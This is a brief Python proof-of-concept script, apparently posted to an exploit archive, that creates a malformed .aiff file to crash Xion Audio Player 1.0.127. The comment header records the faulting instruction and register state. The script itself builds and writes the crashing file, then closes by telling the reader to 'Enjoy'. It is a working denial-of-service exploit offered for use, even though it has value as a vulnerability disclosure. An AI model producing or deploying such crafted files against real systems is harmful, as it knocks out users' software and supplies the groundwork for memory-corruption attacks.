#!/usr/bin/python
 
# -------------------------------------------------------------------
# Xion Audio Player 1.0.127 (.aiff) Denial of Service Vulnerability
# found by condis
#
# Download  : http://xion.r2.com.au/index.php?page=download
# Tested on : Windows XP SP3 Professional PL
#
# Registers :
#
# EAX 00000000
# ECX 02D0B488
# EDX 7C90E4F4 ntdll.KiFastSystemCallRet
# EBX 02D0B4F8
# ESP 02D0B4F8
# EBP 02D0CA60
# ESI 003D8D80
# EDI 00001A00
# EIP 11013C18 BASS.11013C18
#
# 11013C18   C740 20 01000000 MOV DWORD PTR DS:[EAX+20],1 <--- crash
#
# "Access Violation while writing to 00000020"
#
# I've also found this kind of bug while playing around with .flac
# files so I think that handling all of the supported formats must be
# really messed up :<
# --------------------------------------------------------------------
 
evil  = "FORM\x00\x00\x37\xA4AIFFCOMM"
evil += "A" # <--- crash (rest of the file doesn't matters)
 
aiff = open('xion-crash.aiff', 'w')
aiff.write(evil)
aiff.close()
 
print "Malicious .aiff file has been created. Enjoy"